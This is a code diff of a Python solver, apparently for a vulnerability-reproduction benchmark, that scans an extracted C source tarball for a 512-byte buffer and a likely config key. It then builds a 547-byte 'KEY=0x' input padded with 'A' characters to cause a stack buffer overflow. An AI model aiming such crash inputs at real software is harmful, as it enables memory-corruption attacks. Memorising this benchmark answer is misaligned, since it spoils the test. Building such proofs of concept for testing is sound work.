@@ -1,91 +1,81 @@
+import os
 import tarfile
 import tempfile
-import os
 import re
 import shutil
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        tmp_dir = tempfile.mkdtemp()
+        extract_dir = tempfile.mkdtemp()
+        best_key = "hex_val" # Default fallback
+        
         try:
             with tarfile.open(src_path) as tar:
-                tar.extractall(path=tmp_dir)
-
-            # Default fallback values
-            target_key = "config"
-            separator = " = "
+                tar.extractall(path=extract_dir)
             
-            # Regex patterns
-            # 1. Detect 512-byte buffer definition (correlates with 547 byte ground truth)
-            buf_pattern = re.compile(r'char\s+\w+\s*\[\s*512\s*\]')
-            # 2. Detect string comparisons to identify config keys
-            strcmp_pattern = re.compile(r'str(case)?cmp\s*\(\s*[^,]+,\s*"([^"]+)"\s*\)')
-            # 3. Detect hex processing functions
-            hex_pattern = re.compile(r'(isxdigit|sscanf|strtol|strtoul)')
-            # 4. Detect assignment chars
-            eq_pattern = re.compile(r"['\"]=[\"']")
-
-            found_file = False
-
-            # Scan source files
-            for root, dirs, files in os.walk(tmp_dir):
+            candidates = []
+            
+            # Walk through source files
+            for root, dirs, files in os.walk(extract_dir):
                 for file in files:
-                    if file.endswith((".c", ".cpp", ".cc")):
+                    if file.endswith(('.c', '.cpp', '.cc', '.h')):
                         path = os.path.join(root, file)
                         try:
                             with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                                 content = f.read()
-                        except:
-                            continue
-
-                        # Look for potential vulnerability site
-                        if buf_pattern.search(content) and hex_pattern.search(content):
-                            # Extract potential keys
-                            matches = strcmp_pattern.findall(content)
-                            candidates = []
-                            for _, key in matches:
-                                # Filter out common false positives
-                                if len(key) > 1 and key not in ["r", "w", "rb", "wb", "error", "fail", "null", "stdio"]:
-                                    candidates.append(key)
-                            
-                            if candidates:
-                                # Use the first valid looking candidate as the config key
-                                target_key = candidates[0]
                                 
-                                # Heuristic for separator
-                                if eq_pattern.search(content):
-                                    separator = " = "
-                                else:
-                                    separator = " "
+                                # Check if file has a buffer of size 512 (likely target buffer)
+                                has_512 = bool(re.search(r'char\s+\w+\s*\[\s*512\s*\]', content))
+                                
+                                # Extract string literals that could be config keys
+                                literals = re.findall(r'"([a-zA-Z0-9_=-]+)"', content)
+                                for s in literals:
+                                    s_clean = s.replace('=', '').replace(':', '').strip()
+                                    if len(s_clean) < 2: continue
+                                    # Ignore common non-key strings
+                                    if s_clean.lower() in ['wb', 'rb', 'r', 'w', 'error', 'warning', 'info']:
+                                        continue
                                     
-                                found_file = True
-                                break
-                if found_file:
-                    break
+                                    score = 0
+                                    # Heuristics based on problem description and typical patterns
+                                    if 'hex' in s_clean.lower():
+                                        score += 10
+                                    if 'val' in s_clean.lower():
+                                        score += 3
+                                    if has_512:
+                                        score += 5
+                                    if s.endswith('='):
+                                        score += 4
+                                    if 'config' in file.lower() or 'parse' in file.lower():
+                                        score += 2
+                                        
+                                    candidates.append((score, s_clean))
+                        except:
+                            pass
             
-            # Construct Payload
-            # Format: KEY = 0x...
-            # We use 'A' (0x41) as the hex digit filler.
-            
-            prefix = f"{target_key}{separator}0x"
-            suffix = "\n"
-            
-            # Calculate padding to reach target length ~547 bytes
-            # We need to overflow a 512 byte buffer.
-            # 512 buffer + 8 saved rbp + 8 ret = 528 bytes minimum to crash reliably.
-            min_data_len = 528
-            
-            # Aim for ground truth length of 547
-            target_total = 547
-            padding_len = target_total - len(prefix) - len(suffix)
-            
-            # Ensure we have enough data to overflow even if prefix is long
-            if padding_len < min_data_len:
-                padding_len = min_data_len
-            
-            payload_data = "A" * padding_len
-            
-            return (prefix + payload_data + suffix).encode()
-
+            # Select best key
+            if candidates:
+                candidates.sort(key=lambda x: x[0], reverse=True)
+                best_key = candidates[0][1]
+                
+        except Exception:
+            pass
         finally:
-            shutil.rmtree(tmp_dir)
+            shutil.rmtree(extract_dir)
+            
+        # Generate PoC
+        # Goal: Stack Buffer Overflow with long hex value
+        # Target length matches ground truth: 547 bytes
+        # Format assumed: KEY=0x...
+        
+        prefix = f"{best_key}=0x"
+        target_len = 547
+        
+        padding_len = target_len - len(prefix)
+        if padding_len < 0: 
+            padding_len = 520 # Ensure overflow if key is unexpectedly long
+            
+        # Payload composed of valid hex characters 'A' (0x41)
+        payload = prefix.encode() + b'A' * padding_len
+        
+        return payload
